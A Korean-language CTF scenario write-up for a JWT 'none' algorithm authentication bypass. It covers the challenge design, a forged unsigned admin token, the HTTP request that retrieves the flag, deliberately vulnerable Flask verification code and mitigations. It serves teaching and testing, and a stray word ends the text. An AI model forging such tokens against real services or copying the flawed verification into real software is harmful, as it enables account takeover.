---
title: JWT Signature Bypass via 'none' Algorithm — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, jwt, none-algorithm, signature-bypass, auth-bypass]
confidence: high
---

# JWT Signature Bypass via 'none' Algorithm — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Stateless Admin Console (상태 비저장 관리 콘솔)
- **난이도**: Easy-Medium
- **핵심 컨셉**: 세션 토큰으로 JWT(JSON Web Token)를 처리할 때 많이 발생하는 고전적 알고리즘 검증 오류인 **'none' 알고리즘 우회** 취약점 문제입니다. 서버는 유저 식별용 토큰 발급 시 HS256 알고리즘을 사용해 서명하지만, 토큰 검증 단계에서 헤더에 적힌 `alg` 파라미터를 그대로 신뢰합니다. 공격자는 헤더의 `alg`를 서명 검증을 하지 않는 규격인 `none`(또는 `NONE`, `nOnE` 등 대소문자 변형)으로 변경하고 기존의 서명 값을 지워 보냄으로써, 임의로 정보를 조작한 토큰에 대해 서버 인증을 무력화시키고 계정을 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 일반 사용자의 로그인 및 상태 유지를 처리하는 토큰 기반 프론트엔드.
- **Backend Service (Python/Flask or Node.js)**:
  - 로그인 시 `{"username": "guest", "role": "user"}` 등의 정보를 담아 JWT 발급.
  - 헤더의 `Authorization: Bearer <JWT>` 검증 로직 탑재.
- **Flag 위치**: 
  - 토큰의 `role` 값을 `admin`으로 조작하여 관리자 기능 페이지(`/api/admin/flag`)에 접속 시 획득.

### 2.2 취약점 지점
1. **Unsecured Algorithm Acceptance ('none' alg)**:
   - JWT 라이브러리 또는 수동 검증 파서가 `alg: none` 옵션을 기본 차단하지 않고 올바른 서명 방식으로 판별하여 통과시킵니다.
   - 서명 검증 단계에서 `if (header.alg === 'none') { return true; }`와 같이 처리를 거치거나 라이브러리 내부 `decode` 시 알고리즘을 지정하지 않아 발생합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|------------|--------|------|---------|---------|------|
| `/api/admin/flag` | GET | JWT 필요 | Header: `Authorization: Bearer <JWT>` | 플래그 정보 JSON | JWT 조작 우회 공격 대상 경로 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. JWT 토큰 분석
1. 일반 계정(`guest`/`guest`)으로 로그인 후 쿠키나 세션 스토리지에 발급된 JWT 토큰을 획득합니다.
- *원본 JWT*:
  `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.SignaturePart...`
- *디코딩 정보*:
  - Header: `{"alg": "HS256", "typ": "JWT"}`
  - Payload: `{"username": "guest", "role": "user"}`

### Step 2. 'none' 알고리즘 변조 및 페이로드 조작
공격자는 서명값 없이 검증을 우회하기 위해 헤더와 페이로드를 조작합니다.
- **헤더 조작**: `alg` 속성값을 `none`으로 강제 변경합니다.
  `{"alg": "none", "typ": "JWT"}` -> Base64Url 인코딩 -> `eyJhbGciOiJub25lIiwidHlwIjoiSldUIi99`
- **페이로드 조작**: 어드민 권한을 얻기 위해 `role`을 `admin`으로 변경합니다.
  `{"username": "guest", "role": "admin"}` -> Base64Url 인코딩 -> `eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0`

### Step 3. 토큰 조립 및 서명 필드 삭제
JWT 구조는 `Header.Payload.Signature` 세 파트로 이루어집니다. `none` 알고리즘 요청 시에는 세 번째 파트인 서명을 공백으로 비워둡니다. (단, 끝의 점(`.`) 기호는 반드시 부착되어 있어야 합니다.)
- **최종 위조 토큰**:
  `eyJhbGciOiJub25lIiwidHlwIjoiSldUIi99.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0.`

### Step 4. 권한 우회 및 플래그 획득
위조된 토큰을 헤더에 실어 `/api/admin/flag` 엔드포인트로 전송합니다.
- *요청*:
  ```http
  GET /api/admin/flag HTTP/1.1
  Host: stateless-console.challenge.local
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIi99.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0.
  ```
- *서버 동작*: 서버 파서는 알고리즘이 `none`이므로 서명 문자열(빈 문자열) 검증을 통과 처리하고, 페이로드 내의 `role`이 `admin`이므로 관리자 플래그(`FLAG{jwt_none_algorithm_auth_bypass_success}`)를 그대로 응답 결과로 출력합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python PyJWT / Custom Parser)

```python
# app.py (수동 파싱 로직 및 구형 라이브러리 오용 예시)
from flask import Flask, request, jsonify
import base64
import json

app = Flask(__name__)

def base64url_decode(payload):
    # Base64Url 디코딩 처리
    rem = len(payload) % 4
    if rem > 0:
        payload += "=" * (4 - rem)
    return base64.urlsafe_b64decode(payload.encode()).decode()

@app.route("/api/admin/flag")
def get_flag():
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401
        
    token = auth_header.split(" ")[1]
    
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return jsonify({"error": "Invalid token format"}), 400
            
        header_json = json.loads(base64url_decode(parts[0]))
        payload_json = json.loads(base64url_decode(parts[1]))
        
        algorithm = header_json.get("alg", "").lower()
        
        # 취약점 지점: 헤더의 alg가 none인 경우, 서명 검증 단계를 전면 생략하고 통과시킴
        if algorithm == "none":
            # 무검증으로 페이로드 신뢰
            user_role = payload_json.get("role")
        else:
            # 정상적인 HS256 서명 검증 로직 실행 (생략)
            user_role = "user"
            
        if user_role == "admin":
            return jsonify({"flag": "FLAG{jwt_none_algorithm_auth_bypass_success}"})
        else:
            return jsonify({"error": "Forbidden"}), 403
            
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **검증 알고리즘 명시화 및 고정**:
   - JWT 검증 모듈 구동 시, 헤더의 `alg`를 동적으로 따르지 않도록 제한하고 반드시 허용할 서명 규격(예: `algorithms=["HS256"]`)만을 명시적으로 강제하여 `none` 알고리즘 수용 여지를 차단합니다.
2. **최신 JWT 라이브러리 사용 및 수동 파싱 지양**:
   - 독자적인 수동 디코더 작성을 금하고 보안 성숙도가 검증된 오픈소스 라이브러리를 연동합니다. 최신 라이브러리들은 `none` 알고리즘 토큰이 인입될 시 기본 동작 단계에서 에러(`InvalidAlgorithmError`)를 발생시켜 보호합니다.
3. **토큰 서명 누락 방지 가드레일**:
   - 서명 데이터가 없는 토큰(점 기호(`.`)로만 끝나고 시그니처 바디가 공백인 것)은 검증 초입 단계에서 규격 불일치로 신속히 거부하도록 전처리 필터를 기입합니다.
 Mayan
